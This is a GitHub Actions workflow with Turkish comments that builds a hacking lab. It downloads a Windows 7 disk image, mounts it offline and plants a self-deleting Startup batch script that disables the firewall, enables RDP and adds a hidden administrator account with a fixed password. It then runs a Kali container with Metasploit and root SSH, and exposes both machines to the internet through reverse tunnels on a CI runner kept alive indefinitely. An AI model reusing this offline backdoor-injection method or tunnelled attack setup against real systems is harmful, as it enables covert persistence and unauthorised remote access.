name: Win7_Kali_Siber_Duello

on: workflow_dispatch 

jobs:
  Hacker_Mevzisi:
    runs-on: ubuntu-latest
    steps:
      - name: 1. Siber Cephaneliği Kur
        run: |
          sudo apt-get update -qq
          sudo apt-get install qemu-system-x86 python3-pip -y -qq
          # Bore Tüneli (TCP köprüsü için)
          wget -q https://github.com/ekzhang/bore/releases/download/v0.4.1/bore-v0.4.1-x86_64-unknown-linux-musl.tar.gz
          tar -xzf bore-v0.4.1-x86_64-unknown-linux-musl.tar.gz

      - name: 2. Kurbanı Kendi Üssümüzden İndir (Aria2 Turbo Mod)
        run: |
          # Eski kalıntıları temizle
          rm -f kurban_disk.qcow2
          
          # Aria2'yi kuruyoruz (Paralel İndirme Canavarı)
          sudo apt-get install aria2 -y -qq
          
          # 16 Koldan saldırı! 
          # -x 16 : 16 bağlantı açar
          # -s 16 : Dosyayı 16 parçaya böler
          # --summary-interval=10 : Her 10 saniyede bir hız raporu verir
          aria2c -x 16 -s 16 -k 1M --console-log-level=warn --summary-interval=10 -d . -o kurban_disk.qcow2 "https://generation-adapter-writes-seek.trycloudflare.com/win7.qcow2"
          
          # Dosyanın tam indiğini teyit edelim
          FILE_SIZE=$(stat -c%s "kurban_disk.qcow2")
          if [ $FILE_SIZE -lt 100000000 ]; then
            echo "❌ HATA: Dosya tam inmedi! Evdeki Python veya Cloudflare sunucusu kapanmış olabilir."
            exit 1
          fi
          echo "✅ Ganimet Aria2 gücüyle kendi makinemizden şak diye çekildi!"
          
      - name: 3. Kurbana Çip Tak (Offline Disk Enjeksiyonu)
        run: |
          echo "Siber cerrahi başlıyor. Disk masaya yatırıldı..."
          sudo apt-get install qemu-utils ntfs-3g -y -qq
          
          # Diski sanal bir donanım olarak sisteme bağlıyoruz
          sudo modprobe nbd max_part=8
          sudo qemu-nbd -c /dev/nbd0 kurban_disk.qcow2
          sleep 3
          
          # Windows'un C: diskini mount ediyoruz (Win7'de genelde p2'dir, olmazsa p1 dener)
          sudo mkdir -p /mnt/win
          sudo mount -t ntfs-3g /dev/nbd0p2 /mnt/win || sudo mount -t ntfs-3g /dev/nbd0p1 /mnt/win
          
          # Başlangıç (Startup) klasörüne oto-ajan scriptimizi yerleştiriyoruz!
          AUTO_RUN="/mnt/win/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/siber_ayar.bat"
          sudo bash -c "cat > '$AUTO_RUN'" << 'EOF'
          @echo off
          :: Güvenlik duvarını yerle bir et
          netsh advfirewall set allprofiles state off
          
          :: RDP (Uzak Masaüstü) bağlantılarına izin ver
          reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
          net start termservice
          
          :: Sana özel tam yetkili hesap oluştur (RDP için şifre şarttır)
          net user Kral kral123 /add
          net localgroup Administrators Kral /add
          
          :: İzi kaybettir (Script kendini silsin)
          del "%~f0"
          EOF
          
          # Müdahale bitti, hastayı kapatıyoruz
          sudo umount /mnt/win
          sudo qemu-nbd -d /dev/nbd0
          echo "✅ Çip başarıyla yerleştirildi! Win7 uyanır uyanmaz kalkanları kendi kendine indirecek."
          
      - name: 4. Kali Linux'u (Saldırgan) Kur ve SSH'ı Hazırla
        run: |
          # Kali Docker konteynerini başlatıyoruz
          docker run -d --net=host --name kali_saldirgan kalilinux/kali-rolling sleep infinity
          
          # SSH ve sızma araçlarının kurulumu
          docker exec kali_saldirgan apt-get update -y
          docker exec kali_saldirgan apt-get install -y openssh-server metasploit-framework iproute2
          
          # SSH ayarları ve Şifre (root:kral123)
          docker exec kali_saldirgan mkdir -p /run/sshd
          docker exec kali_saldirgan bash -c "echo 'root:kral123' | chpasswd"
          
          # KRİTİK NOKTA: Çakışmayı önlemek için Kali'nin portunu 2222 yapıyoruz
          docker exec kali_saldirgan bash -c "echo 'Port 2222' >> /etc/ssh/sshd_config"
          docker exec kali_saldirgan bash -c "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config"
          docker exec kali_saldirgan bash -c "echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config"
          
          # Kali SSH servisini başlat
          docker exec kali_saldirgan service ssh start

      - name: 5. Siber Köprüleri (Sarsılmaz Pinggy Tünelleri) Başlat
        run: |
          # Bore'u çöpe atıyoruz. Saf SSH ile TCP tüneli kazıyoruz!
          
          # 1. Tünel: Win7 Ekranı (VNC - Port 5901)
          # Pinggy TCP tünelini arka planda başlatıyoruz
          ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:5901 tcp@a.pinggy.io > vnc_pinggy.log 2>&1 &
          
          # 2. Tünel: Kali Komut Satırı (SSH - Port 2222)
          ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:2222 tcp@a.pinggy.io > ssh_pinggy.log 2>&1 &
          
          sleep 15
          echo "================================================================"
          echo "🔥 SARSILMAZ SİBER DÜELLO ALANI HAZIR!"
          
          # VNC Adresini loglardan çekiyoruz
          VNC_URL=$(grep -oE 'tcp://[a-zA-Z0-9.-]+:[0-9]+' vnc_pinggy.log | head -n 1 | sed 's/tcp:\/\///')
          echo "🖥️ WIN7 EKRANI (VNC Viewer ile gir): ${VNC_URL}"
          
          # SSH Adresini loglardan çekiyoruz
          SSH_URL=$(grep -oE 'tcp://[a-zA-Z0-9.-]+:[0-9]+' ssh_pinggy.log | head -n 1 | sed 's/tcp:\/\///')
          SSH_HOST=$(echo $SSH_URL | cut -d':' -f1)
          SSH_PORT=$(echo $SSH_URL | cut -d':' -f2)
          
          echo "💀 KALI SSH BAĞLANTISI: ssh root@${SSH_HOST} -p ${SSH_PORT}"
          echo "🔑 KALI ŞİFRE: kral123"
          echo "----------------------------------------------------------------"
          echo "🎯 KALI İÇİNDEN SALDIRI HEDEFİ: 127.0.0.1:4445"
          echo "================================================================"
          
      - name: 6. Operasyonu Hayatta Tut
        run: |
          while true; do sleep 300; echo "Sistem uçuşta, kurban tetikte..."; done
